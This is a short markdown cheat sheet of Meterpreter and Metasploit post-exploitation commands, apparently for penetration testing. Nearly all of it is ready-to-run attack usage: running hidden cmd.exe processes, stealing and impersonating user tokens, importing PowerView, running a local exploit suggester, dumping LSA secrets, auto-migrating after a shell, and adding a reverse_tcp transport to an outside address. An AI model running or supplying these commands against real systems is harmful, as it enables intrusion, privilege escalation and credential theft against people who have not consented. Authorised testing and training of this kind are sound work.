# Meterpreter and Metasploit
======
#### Port Forwarding
portfwd add -l 1111 -p 22 -r Target2
#### Screenshot
screenshot -p file.jpg
#### Idle Time
idletime
#### Disable/Enable Mouse
uictl
#### Execute a command (interact with process / create a hidden process)
execute -f cmd.exe -i -H
#### Execute a command with arguments
execute -f cmd.exe -H -a "/c net users"
#### Steal a token from PID
steal_token PID
#### Impersonate a User Token
+ load incognito
+  list tokens -u
+  impersonate_token '<domain\user>'

#### Spawn Process as Impersonated User
execute -f cmd.exe -i -H -t 
#### Powershell Execute (load powershell)
powershell_execute "Get-ChildItem C:\Users\user -Recurse"
#### Powershell Import
powershell_import /path/to/powerview.ps1
#### Immediately Background Sessions
exploit -j
#### Set global variable
setg RHOSTS 1.2.3.4
#### Local Exploit Suggester
meterpreter> run post/multi/recon/local_exploit_suggester

## msfvenom
------
#### List Payloads
msfvenom --list payloads
#### Payload Types
asp, perl, jsp, python, jar, php, linux (elf), windows (exe, dll, ps1, psh-cmd)

## Modules
------
#### windows/gather/lsa_secrets
Dumps LSA Secrets.  You can also use Kiwi's lsa_dump_secrets (probably better).
#### Autorun a Script after Shell
set AutoRunScript post/windows/manage/migrate

## Transport
------
#### List Transport Options
transport list
#### Add Transport
transport add -t reverse_tcp -l 10.1.1.1 -p 5555